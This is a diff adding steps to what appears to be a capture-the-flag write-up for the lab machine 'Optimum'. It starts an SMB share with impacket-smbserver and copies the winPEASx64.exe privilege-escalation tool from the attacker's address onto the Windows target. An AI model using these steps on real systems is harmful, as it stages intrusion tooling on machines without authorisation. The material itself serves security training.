@@ -76,3 +76,12 @@ PS C:\Users\kostas\Desktop>systeminfo
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236140832-cb67ae27-8fb1-42cf-8dcc-b03aca12c96c.png)
 
+  - Start SMB server.
+```CSS
+▶ sudo impacket-smbserver share . -smb2support
+```
+  - Copy `winPEASx64.exe` to optimum.
+```CSS
+▶ copy \\10.10.14.21\share\winPEASx64.exe .
+```
+![image](https://user-images.githubusercontent.com/83878909/236153111-422fdf8f-75cd-46dd-83f1-ab8a88d517ad.png)
